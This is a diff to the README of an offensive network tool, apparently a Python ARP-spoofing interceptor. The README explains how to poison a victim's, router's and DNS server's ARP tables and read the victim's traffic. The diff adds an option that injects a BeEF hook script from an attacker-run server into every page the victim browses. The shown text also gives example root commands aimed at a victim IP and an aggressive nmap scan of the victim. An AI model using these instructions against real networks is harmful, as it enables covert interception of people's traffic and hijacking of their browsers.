@@ -3,7 +3,7 @@ intercept
 
 Individually arpspoofs the target box, router and DNS server if necessary. Displays all most the interesting bits of their traffic. Cleans up after itself. 
 
-Prereqs: Linux, scapy, python nfqueue-bindings, aircrack-ng, python twisted
+Prereqs: Linux, scapy, python nfqueue-bindings, aircrack-ng, python twisted, BeEF (option)
 
 Example usage as root:
 python intercept.py -u -p -d -ip 192.168.0.10
@@ -37,6 +37,9 @@ python intercept.py -h
 
 -na, performs an aggressive nmap scan in the background and outputs to [victim IP address].nmap.txt
 
+-b BEEF_HOOK_URL, copy the BeEF hook URL to inject it into every page the victim visits, eg: -b http://192.168.1.10:3000/hook.js
+
+
 
 Cleans the following on Ctrl-C:
 
@@ -45,6 +48,7 @@ Cleans the following on Ctrl-C:
   flush iptables firewall
 
   individually restore each machine's ARP table
+
 
 
 To do:
